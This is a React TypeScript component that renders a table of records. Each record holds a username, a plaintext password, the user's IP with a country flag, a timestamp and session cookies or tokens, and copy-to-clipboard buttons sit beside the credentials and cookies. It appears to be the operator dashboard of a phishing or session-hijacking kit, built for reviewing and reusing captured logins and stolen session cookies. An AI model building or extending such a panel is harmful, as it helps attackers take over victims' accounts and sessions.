import React, { useState, useEffect } from "react";
import { getCountryCode } from "../utils/ipToCountry";

interface DataTableProps {
  data: {
    id: string;
    username: string;
    password: string;
    userIp: string;
    dateTime: string;
    cookies: string;
    tokens: Array<{ name: string; value: string }>;
  }[];
}

// Add this copy icon component
const CopyIcon = ({ onClick }: { onClick: () => void }) => (
  <button
    onClick={onClick}
    className="text-indigo-400 hover:text-indigo-300 ml-1 transition-colors"
  >
    <svg
      className="w-4 h-4"
      fill="none"
      stroke="currentColor"
      viewBox="0 0 24 24"
    >
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        strokeWidth={2}
        d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
      />
    </svg>
  </button>
);

export default function DataTable({ data }: DataTableProps) {
  const [showCopied, setShowCopied] = useState(false);
  const [countryCodes, setCountryCodes] = useState<Record<string, string>>({});

  useEffect(() => {
    const fetchCodes = async () => {
      const newCodes: Record<string, string> = {};
      // Use functional update to get latest state
      setCountryCodes((currentCodes) => {
        for (const row of data) {
          if (row.userIp && !currentCodes[row.userIp]) {
            // Immediately store placeholder to prevent duplicate requests
            newCodes[row.userIp] = "loading";
          }
        }
        return { ...currentCodes, ...newCodes };
      });

      // Fetch codes after state update
      for (const row of data) {
        if (row.userIp) {
          const code = await getCountryCode(row.userIp);
          newCodes[row.userIp] = code;
          // Batch updates with functional updates
          setCountryCodes((prev) => ({ ...prev, [row.userIp]: code }));
        }
      }
    };
    fetchCodes();
  }, [data]);

  const formatCookies = (cookies: Array<{ name: string; value: string }>) => {
    return cookies.map((c) => `${c.name}=${c.value}`).join("; ");
  };

  return (
    <div className="bg-[#232A34] rounded-lg overflow-hidden">
      <table className="w-full text-left">
        <thead className="bg-[#1B2028] text-gray-400">
          <tr>
            <th className="p-4">ID</th>
            <th className="p-4">Username</th>
            <th className="p-4">Password</th>
            <th className="p-4">User IP</th>
            <th className="p-4">Date & Time</th>
            <th className="p-4">Cookies</th>
          </tr>
        </thead>
        <tbody className="text-white">
          {data.map((row) => (
            <tr key={row.id} className="border-b border-[#2C333D]">
              <td className="p-4">{row.id}</td>
              <td className="p-4">
                <div className="flex items-center">
                  {row.username || "N/A"}
                  {row.username && (
                    <CopyIcon
                      onClick={() => {
                        navigator.clipboard.writeText(row.username);
                        setShowCopied(true);
                        setTimeout(() => setShowCopied(false), 2000);
                      }}
                    />
                  )}
                </div>
              </td>
              <td className="p-4">
                <div className="flex items-center">
                  {row.password || "N/A"}
                  {row.password && (
                    <CopyIcon
                      onClick={() => {
                        navigator.clipboard.writeText(row.password);
                        setShowCopied(true);
                        setTimeout(() => setShowCopied(false), 2000);
                      }}
                    />
                  )}
                </div>
              </td>
              <td className="p-4">
                <div className="flex items-center">
                  {row.userIp && countryCodes[row.userIp] && (
                    <img
                      src={`https://flagcdn.com/${countryCodes[
                        row.userIp
                      ].toLowerCase()}.svg`}
                      className="w-5 h-3.5 mr-2"
                      alt={countryCodes[row.userIp]}
                      onError={(e) => {
                        (
                          e.target as HTMLImageElement
                        ).src = `https://flagcdn.com/us.svg`;
                      }}
                    />
                  )}
                  {row.userIp}
                  {row.userIp && (
                    <CopyIcon
                      onClick={() => {
                        navigator.clipboard.writeText(row.userIp);
                        setShowCopied(true);
                        setTimeout(() => setShowCopied(false), 2000);
                      }}
                    />
                  )}
                </div>
              </td>
              <td className="p-4">{row.dateTime}</td>
              <td className="p-4">
                <button
                  className="bg-indigo-500 text-white px-4 py-2 rounded"
                  onClick={() => {
                    const cookieString = formatCookies(row.tokens);
                    navigator.clipboard.writeText(cookieString);
                    setShowCopied(true);
                    setTimeout(() => setShowCopied(false), 2000);
                  }}
                >
                  Cookies
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
      {showCopied && (
        <div className="fixed bottom-4 right-4 bg-green-500 text-white px-4 py-2 rounded-lg shadow-lg">
          Copied!
        </div>
      )}
    </div>
  );
}
